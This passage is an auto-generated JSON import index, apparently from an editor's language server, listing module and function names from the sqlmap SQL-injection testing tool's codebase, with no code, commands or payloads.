        "detail": "lib.core.log",
        "documentation": {}
    },
    {
        "label": "optDict",
        "importPath": "lib.core.optiondict",
        "description": "lib.core.optiondict",
        "isExtraImport": true,
        "detail": "lib.core.optiondict",
        "documentation": {}
    },
    {
        "label": "optDict",
        "importPath": "lib.core.optiondict",
        "description": "lib.core.optiondict",
        "isExtraImport": true,
        "detail": "lib.core.optiondict",
        "documentation": {}
    },
    {
        "label": "optDict",
        "importPath": "lib.core.optiondict",
        "description": "lib.core.optiondict",
        "isExtraImport": true,
        "detail": "lib.core.optiondict",
        "documentation": {}
    },
    {
        "label": "optDict",
        "importPath": "lib.core.optiondict",
        "description": "lib.core.optiondict",
        "isExtraImport": true,
        "detail": "lib.core.optiondict",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safechardecode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safechardecode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safechardecode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safechardecode",
        "importPath": "lib.utils.safe2bin",
        "description": "lib.utils.safe2bin",
        "isExtraImport": true,
        "detail": "lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "ParseResponse",
        "importPath": "thirdparty.clientform.clientform",
        "description": "thirdparty.clientform.clientform",
        "isExtraImport": true,
        "detail": "thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ParseError",
        "importPath": "thirdparty.clientform.clientform",
        "description": "thirdparty.clientform.clientform",
        "isExtraImport": true,
        "detail": "thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "init",
        "importPath": "thirdparty.colorama.initialise",
        "description": "thirdparty.colorama.initialise",
        "isExtraImport": true,
        "detail": "thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "init",
        "importPath": "thirdparty.colorama.initialise",
        "description": "thirdparty.colorama.initialise",
        "isExtraImport": true,
        "detail": "thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "magic",
        "importPath": "thirdparty.magic",
        "description": "thirdparty.magic",
        "isExtraImport": true,
        "detail": "thirdparty.magic",
        "documentation": {}
    },
    {
        "label": "magic",
        "importPath": "thirdparty.magic",
        "description": "thirdparty.magic",
        "isExtraImport": true,
        "detail": "thirdparty.magic",
        "documentation": {}
    },
    {
        "label": "OrderedDict",
        "importPath": "thirdparty.odict",
        "description": "thirdparty.odict",
        "isExtraImport": true,
        "detail": "thirdparty.odict",
        "documentation": {}
    },
    {
        "label": "OrderedDict",
        "importPath": "thirdparty.odict",
        "description": "thirdparty.odict",
        "isExtraImport": true,
        "detail": "thirdparty.odict",
        "documentation": {}
    },
    {
        "label": "OrderedDict",
        "importPath": "thirdparty.odict",
        "description": "thirdparty.odict",
        "isExtraImport": true,
        "detail": "thirdparty.odict",
        "documentation": {}
    },
    {
        "label": "OrderedDict",
        "importPath": "thirdparty.odict",
        "description": "thirdparty.odict",
        "isExtraImport": true,
        "detail": "thirdparty.odict",
        "documentation": {}
    },
    {
        "label": "OrderedDict",
        "importPath": "thirdparty.odict",
        "description": "thirdparty.odict",
        "isExtraImport": true,
        "detail": "thirdparty.odict",
        "documentation": {}
    },
    {
        "label": "OrderedDict",
        "importPath": "thirdparty.odict",
        "description": "thirdparty.odict",
        "isExtraImport": true,
        "detail": "thirdparty.odict",
        "documentation": {}
    },
    {
        "label": "unichr",
        "importPath": "thirdparty.six",
        "description": "thirdparty.six",
        "isExtraImport": true,
        "detail": "thirdparty.six",
        "documentation": {}
    },
    {
        "label": "unichr",
        "importPath": "thirdparty.six",
        "description": "thirdparty.six",
        "isExtraImport": true,
        "detail": "thirdparty.six",
        "documentation": {}
    },
    {
        "label": "unichr",
        "importPath": "thirdparty.six",
        "description": "thirdparty.six",
        "isExtraImport": true,
        "detail": "thirdparty.six",
        "documentation": {}
    },
    {
        "label": "unichr",
        "importPath": "thirdparty.six",
        "description": "thirdparty.six",
        "isExtraImport": true,
        "detail": "thirdparty.six",
        "documentation": {}
    },
    {
        "label": "unichr",
        "importPath": "thirdparty.six",
        "description": "thirdparty.six",
        "isExtraImport": true,
        "detail": "thirdparty.six",
        "documentation": {}
    },
    {
        "label": "unichr",
        "importPath": "thirdparty.six",
        "description": "thirdparty.six",
        "isExtraImport": true,
        "detail": "thirdparty.six",
        "documentation": {}
    },
    {
        "label": "unichr",
        "importPath": "thirdparty.six",
        "description": "thirdparty.six",
        "isExtraImport": true,
        "detail": "thirdparty.six",
        "documentation": {}
    },
    {
        "label": "colored",
        "importPath": "thirdparty.termcolor.termcolor",
        "description": "thirdparty.termcolor.termcolor",
        "isExtraImport": true,
        "detail": "thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "uuid",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "uuid",
        "description": "uuid",
        "detail": "uuid",
        "documentation": {}
    },
    {
        "label": "shutil",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "shutil",
        "description": "shutil",
        "detail": "shutil",
        "documentation": {}
    },
    {
        "label": "Replication",
        "importPath": "lib.core.replication",
        "description": "lib.core.replication",
        "isExtraImport": true,
        "detail": "lib.core.replication",
        "documentation": {}
    },
    {
        "label": "webbrowser",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "webbrowser",
        "description": "webbrowser",
        "detail": "webbrowser",
        "documentation": {}
    },
    {
        "label": "glob",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "glob",
        "description": "glob",
        "detail": "glob",
        "documentation": {}
    },
    {
        "label": "glob",
        "importPath": "glob",
        "description": "glob",
        "isExtraImport": true,
        "detail": "glob",
        "documentation": {}
    },
    {
        "label": "update",
        "importPath": "lib.core.update",
        "description": "lib.core.update",
        "isExtraImport": true,
        "detail": "lib.core.update",
        "documentation": {}
    },
    {
        "label": "configFileParser",
        "importPath": "lib.parse.configfile",
        "description": "lib.parse.configfile",
        "isExtraImport": true,
        "detail": "lib.parse.configfile",
        "documentation": {}
    },
    {
        "label": "loadBoundaries",
        "importPath": "lib.parse.payloads",
        "description": "lib.parse.payloads",
        "isExtraImport": true,
        "detail": "lib.parse.payloads",
        "documentation": {}
    },
    {
        "label": "loadPayloads",
        "importPath": "lib.parse.payloads",
        "description": "lib.parse.payloads",
        "isExtraImport": true,
        "detail": "lib.parse.payloads",
        "documentation": {}
    },
    {
        "label": "checkCharEncoding",
        "importPath": "lib.request.basic",
        "description": "lib.request.basic",
        "isExtraImport": true,
        "detail": "lib.request.basic",
        "documentation": {}
    },
    {
        "label": "decodePage",
        "importPath": "lib.request.basic",
        "description": "lib.request.basic",
        "isExtraImport": true,
        "detail": "lib.request.basic",
        "documentation": {}
    },
    {
        "label": "forgeHeaders",
        "importPath": "lib.request.basic",
        "description": "lib.request.basic",
        "isExtraImport": true,
        "detail": "lib.request.basic",
        "documentation": {}
    },
    {
        "label": "processResponse",
        "importPath": "lib.request.basic",
        "description": "lib.request.basic",
        "isExtraImport": true,
        "detail": "lib.request.basic",
        "documentation": {}
    },
    {
        "label": "decodePage",
        "importPath": "lib.request.basic",
        "description": "lib.request.basic",
        "isExtraImport": true,
        "detail": "lib.request.basic",
        "documentation": {}
    },
    {
        "label": "parseResponse",
        "importPath": "lib.request.basic",
        "description": "lib.request.basic",
        "isExtraImport": true,
        "detail": "lib.request.basic",
        "documentation": {}
    },
    {
        "label": "decodePage",
        "importPath": "lib.request.basic",
        "description": "lib.request.basic",
        "isExtraImport": true,
        "detail": "lib.request.basic",
        "documentation": {}
    },
    {
        "label": "SmartHTTPBasicAuthHandler",
        "importPath": "lib.request.basicauthhandler",
        "description": "lib.request.basicauthhandler",
        "isExtraImport": true,
        "detail": "lib.request.basicauthhandler",
        "documentation": {}
    },
    {
        "label": "ChunkedHandler",
        "importPath": "lib.request.chunkedhandler",
        "description": "lib.request.chunkedhandler",
        "isExtraImport": true,
        "detail": "lib.request.chunkedhandler",
        "documentation": {}
    },
    {
        "label": "DNSServer",
        "importPath": "lib.request.dns",
        "description": "lib.request.dns",
        "isExtraImport": true,
        "detail": "lib.request.dns",
        "documentation": {}
    },
    {
        "label": "HTTPSHandler",
        "importPath": "lib.request.httpshandler",
        "description": "lib.request.httpshandler",
        "isExtraImport": true,
        "detail": "lib.request.httpshandler",
        "documentation": {}
    },
    {
        "label": "HTTPSPKIAuthHandler",
        "importPath": "lib.request.pkihandler",
        "description": "lib.request.pkihandler",
        "isExtraImport": true,
        "detail": "lib.request.pkihandler",
        "documentation": {}
    },
    {
        "label": "HTTPRangeHandler",
        "importPath": "lib.request.rangehandler",
        "description": "lib.request.rangehandler",
        "isExtraImport": true,
        "detail": "lib.request.rangehandler",
        "documentation": {}
    },
    {
        "label": "SmartRedirectHandler",
        "importPath": "lib.request.redirecthandler",
        "description": "lib.request.redirecthandler",
        "isExtraImport": true,
        "detail": "lib.request.redirecthandler",
        "documentation": {}
    },
    {
        "label": "crawl",
        "importPath": "lib.utils.crawler",
        "description": "lib.utils.crawler",
        "isExtraImport": true,
        "detail": "lib.utils.crawler",
        "documentation": {}
    },
    {
        "label": "checkDependencies",
        "importPath": "lib.utils.deps",
        "description": "lib.utils.deps",
        "isExtraImport": true,
        "detail": "lib.utils.deps",
        "documentation": {}
    },
    {
        "label": "HTTPCollectorFactory",
        "importPath": "lib.utils.har",
        "description": "lib.utils.har",
        "isExtraImport": true,
        "detail": "lib.utils.har",
        "documentation": {}
    },
    {
        "label": "purge",
        "importPath": "lib.utils.purge",
        "description": "lib.utils.purge",
        "isExtraImport": true,
        "detail": "lib.utils.purge",
        "documentation": {}
    },
    {
        "label": "lib.utils.search",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.utils.search",
        "description": "lib.utils.search",
        "detail": "lib.utils.search",
        "documentation": {}
    },
    {
        "label": "search",
        "importPath": "lib.utils.search",
        "description": "lib.utils.search",
        "isExtraImport": true,
        "detail": "lib.utils.search",
        "documentation": {}
    },
    {
        "label": "keepalive",
        "importPath": "thirdparty.keepalive",
        "description": "thirdparty.keepalive",
        "isExtraImport": true,
        "detail": "thirdparty.keepalive",
        "documentation": {}
    },
    {
        "label": "multipartpost",
        "importPath": "thirdparty.multipart",
        "description": "thirdparty.multipart",
        "isExtraImport": true,
        "detail": "thirdparty.multipart",
        "documentation": {}
    },
    {
        "label": "socks",
        "importPath": "thirdparty.socks",
        "description": "thirdparty.socks",
        "isExtraImport": true,
        "detail": "thirdparty.socks",
        "documentation": {}
    },
    {
        "label": "socks",
        "importPath": "thirdparty.socks",
        "description": "thirdparty.socks",
        "isExtraImport": true,
        "detail": "thirdparty.socks",
        "documentation": {}
    },
    {
        "label": "ElementTree",
        "importPath": "xml.etree.ElementTree",
        "description": "xml.etree.ElementTree",
        "isExtraImport": true,
        "detail": "xml.etree.ElementTree",
        "documentation": {}
    },
    {
        "label": "lib.core.option",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.core.option",
        "description": "lib.core.option",
        "detail": "lib.core.option",
        "documentation": {}
    },
    {
        "label": "_setHTTPHandlers",
        "importPath": "lib.core.option",
        "description": "lib.core.option",
        "isExtraImport": true,
        "detail": "lib.core.option",
        "documentation": {}
    },
    {
        "label": "setVerbosity",
        "importPath": "lib.core.option",
        "description": "lib.core.option",
        "isExtraImport": true,
        "detail": "lib.core.option",
        "documentation": {}
    },
    {
        "label": "_setAuthCred",
        "importPath": "lib.core.option",
        "description": "lib.core.option",
        "isExtraImport": true,
        "detail": "lib.core.option",
        "documentation": {}
    },
    {
        "label": "_setDBMS",
        "importPath": "lib.core.option",
        "description": "lib.core.option",
        "isExtraImport": true,
        "detail": "lib.core.option",
        "documentation": {}
    },
    {
        "label": "_setKnowledgeBaseAttributes",
        "importPath": "lib.core.option",
        "description": "lib.core.option",
        "isExtraImport": true,
        "detail": "lib.core.option",
        "documentation": {}
    },
    {
        "label": "_createHomeDirectories",
        "importPath": "lib.core.option",
        "description": "lib.core.option",
        "isExtraImport": true,
        "detail": "lib.core.option",
        "documentation": {}
    },
    {
        "label": "thirdparty.ansistrm.ansistrm",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "thirdparty.ansistrm.ansistrm",
        "description": "thirdparty.ansistrm.ansistrm",
        "detail": "thirdparty.ansistrm.ansistrm",
        "documentation": {}
    },
    {
        "label": "thirdparty.chardet.universaldetector",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "thirdparty.chardet.universaldetector",
        "description": "thirdparty.chardet.universaldetector",
        "detail": "thirdparty.chardet.universaldetector",
        "documentation": {}
    },
    {
        "label": "cProfile",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "cProfile",
        "description": "cProfile",
        "detail": "cProfile",
        "documentation": {}
    },
    {
        "label": "atexit",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "atexit",
        "description": "atexit",
        "detail": "atexit",
        "documentation": {}
    },
    {
        "label": "readlineng",
        "importPath": "lib.core",
        "description": "lib.core",
        "isExtraImport": true,
        "detail": "lib.core",
        "documentation": {}
    },
    {
        "label": "errno",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "errno",
        "description": "errno",
        "detail": "errno",
        "documentation": {}
    },
    {
        "label": "EOPNOTSUPP",
        "importPath": "errno",
        "description": "errno",
        "isExtraImport": true,
        "detail": "errno",
        "documentation": {}
    },
    {
        "label": "EINVAL",
        "importPath": "errno",
        "description": "errno",
        "isExtraImport": true,
        "detail": "errno",
        "documentation": {}
    },
    {
        "label": "EAGAIN",
        "importPath": "errno",
        "description": "errno",
        "isExtraImport": true,
        "detail": "errno",
        "documentation": {}
    },
    {
        "label": "dumper",
        "importPath": "lib.core.dump",
        "description": "lib.core.dump",
        "isExtraImport": true,
        "detail": "lib.core.dump",
        "documentation": {}
    },
    {
        "label": "HashDB",
        "importPath": "lib.utils.hashdb",
        "description": "lib.utils.hashdb",
        "isExtraImport": true,
        "detail": "lib.utils.hashdb",
        "documentation": {}
    },
    {
        "label": "doctest",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "doctest",
        "description": "doctest",
        "detail": "doctest",
        "documentation": {}
    },
    {
        "label": "vulnserver",
        "importPath": "extra.vulnserver",
        "description": "extra.vulnserver",
        "isExtraImport": true,
        "detail": "extra.vulnserver",
        "documentation": {}
    },
    {
        "label": "unisonRandom",
        "importPath": "lib.core.patch",
        "description": "lib.core.patch",
        "isExtraImport": true,
        "detail": "lib.core.patch",
        "documentation": {}
    },
    {
        "label": "dirtyPatches",
        "importPath": "lib.core.patch",
        "description": "lib.core.patch",
        "isExtraImport": true,
        "detail": "lib.core.patch",
        "documentation": {}
    },
    {
        "label": "resolveCrossReferences",
        "importPath": "lib.core.patch",
        "description": "lib.core.patch",
        "isExtraImport": true,
        "detail": "lib.core.patch",
        "documentation": {}
    },
    {
        "label": "zipfile",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "zipfile",
        "description": "zipfile",
        "detail": "zipfile",
        "documentation": {}
    },
    {
        "label": "getRevisionNumber",
        "importPath": "lib.core.revision",
        "description": "lib.core.revision",
        "isExtraImport": true,
        "detail": "lib.core.revision",
        "documentation": {}
    },
    {
        "label": "ContentHandler",
        "importPath": "xml.sax.handler",
        "description": "xml.sax.handler",
        "isExtraImport": true,
        "detail": "xml.sax.handler",
        "documentation": {}
    },
    {
        "label": "ContentHandler",
        "importPath": "xml.sax.handler",
        "description": "xml.sax.handler",
        "isExtraImport": true,
        "detail": "xml.sax.handler",
        "documentation": {}
    },
    {
        "label": "ContentHandler",
        "importPath": "xml.sax.handler",
        "description": "xml.sax.handler",
        "isExtraImport": true,
        "detail": "xml.sax.handler",
        "documentation": {}
    },
    {
        "label": "FingerprintHandler",
        "importPath": "lib.parse.handler",
        "description": "lib.parse.handler",
        "isExtraImport": true,
        "detail": "lib.parse.handler",
        "documentation": {}
    },
    {
        "label": "FingerprintHandler",
        "importPath": "lib.parse.handler",
        "description": "lib.parse.handler",
        "isExtraImport": true,
        "detail": "lib.parse.handler",
        "documentation": {}
    },
    {
        "label": "shlex",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "shlex",
        "description": "shlex",
        "detail": "shlex",
        "documentation": {}
    },
    {
        "label": "autoCompletion",
        "importPath": "lib.core.shell",
        "description": "lib.core.shell",
        "isExtraImport": true,
        "detail": "lib.core.shell",
        "documentation": {}
    },
    {
        "label": "clearHistory",
        "importPath": "lib.core.shell",
        "description": "lib.core.shell",
        "isExtraImport": true,
        "detail": "lib.core.shell",
        "documentation": {}
    },
    {
        "label": "loadHistory",
        "importPath": "lib.core.shell",
        "description": "lib.core.shell",
        "isExtraImport": true,
        "detail": "lib.core.shell",
        "documentation": {}
    },
    {
        "label": "saveHistory",
        "importPath": "lib.core.shell",
        "description": "lib.core.shell",
        "isExtraImport": true,
        "detail": "lib.core.shell",
        "documentation": {}
    },
    {
        "label": "autoCompletion",
        "importPath": "lib.core.shell",
        "description": "lib.core.shell",
        "isExtraImport": true,
        "detail": "lib.core.shell",
        "documentation": {}
    },
    {
        "label": "autoCompletion",
        "importPath": "lib.core.shell",
        "description": "lib.core.shell",
        "isExtraImport": true,
        "detail": "lib.core.shell",
        "documentation": {}
    },
    {
        "label": "autoCompletion",
        "importPath": "lib.core.shell",
        "description": "lib.core.shell",
        "isExtraImport": true,
        "detail": "lib.core.shell",
        "documentation": {}
    },
    {
        "label": "ElementTree",
        "importPath": "xml.etree",
        "description": "xml.etree",
        "isExtraImport": true,
        "detail": "xml.etree",
        "documentation": {}
    },
    {
        "label": "gzip",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "gzip",
        "description": "gzip",
        "detail": "gzip",
        "documentation": {}
    },
    {
        "label": "headersParser",
        "importPath": "lib.parse.headers",
        "description": "lib.parse.headers",
        "isExtraImport": true,
        "detail": "lib.parse.headers",
        "documentation": {}
    },
    {
        "label": "htmlParser",
        "importPath": "lib.parse.html",
        "description": "lib.parse.html",
        "isExtraImport": true,
        "detail": "lib.parse.html",
        "documentation": {}
    },
    {
        "label": "detect",
        "importPath": "thirdparty.chardet",
        "description": "thirdparty.chardet",
        "isExtraImport": true,
        "detail": "thirdparty.chardet",
        "documentation": {}
    },
    {
        "label": "identYwaf",
        "importPath": "thirdparty.identywaf",
        "description": "thirdparty.identywaf",
        "isExtraImport": true,
        "detail": "thirdparty.identywaf",
        "documentation": {}
    },
    {
        "label": "direct",
        "importPath": "lib.request.direct",
        "description": "lib.request.direct",
        "isExtraImport": true,
        "detail": "lib.request.direct",
        "documentation": {}
    },
    {
        "label": "direct",
        "importPath": "lib.request.direct",
        "description": "lib.request.direct",
        "isExtraImport": true,
        "detail": "lib.request.direct",
        "documentation": {}
    },
    {
        "label": "MethodRequest",
        "importPath": "lib.request.methodrequest",
        "description": "lib.request.methodrequest",
        "isExtraImport": true,
        "detail": "lib.request.methodrequest",
        "documentation": {}
    },
    {
        "label": "ProxyError",
        "importPath": "thirdparty.socks.socks",
        "description": "thirdparty.socks.socks",
        "isExtraImport": true,
        "detail": "thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "timeout",
        "importPath": "lib.utils.timeout",
        "description": "lib.utils.timeout",
        "isExtraImport": true,
        "detail": "lib.utils.timeout",
        "documentation": {}
    },
    {
        "label": "bisection",
        "importPath": "lib.techniques.blind.inference",
        "description": "lib.techniques.blind.inference",
        "isExtraImport": true,
        "detail": "lib.techniques.blind.inference",
        "documentation": {}
    },
    {
        "label": "queryOutputLength",
        "importPath": "lib.techniques.blind.inference",
        "description": "lib.techniques.blind.inference",
        "isExtraImport": true,
        "detail": "lib.techniques.blind.inference",
        "documentation": {}
    },
    {
        "label": "dnsTest",
        "importPath": "lib.techniques.dns.test",
        "description": "lib.techniques.dns.test",
        "isExtraImport": true,
        "detail": "lib.techniques.dns.test",
        "documentation": {}
    },
    {
        "label": "dnsUse",
        "importPath": "lib.techniques.dns.use",
        "description": "lib.techniques.dns.use",
        "isExtraImport": true,
        "detail": "lib.techniques.dns.use",
        "documentation": {}
    },
    {
        "label": "dnsUse",
        "importPath": "lib.techniques.dns.use",
        "description": "lib.techniques.dns.use",
        "isExtraImport": true,
        "detail": "lib.techniques.dns.use",
        "documentation": {}
    },
    {
        "label": "errorUse",
        "importPath": "lib.techniques.error.use",
        "description": "lib.techniques.error.use",
        "isExtraImport": true,
        "detail": "lib.techniques.error.use",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "inject",
        "importPath": "lib.request",
        "description": "lib.request",
        "isExtraImport": true,
        "detail": "lib.request",
        "documentation": {}
    },
    {
        "label": "UDF",
        "importPath": "lib.takeover.udf",
        "description": "lib.takeover.udf",
        "isExtraImport": true,
        "detail": "lib.takeover.udf",
        "documentation": {}
    },
    {
        "label": "Web",
        "importPath": "lib.takeover.web",
        "description": "lib.takeover.web",
        "isExtraImport": true,
        "detail": "lib.takeover.web",
        "documentation": {}
    },
    {
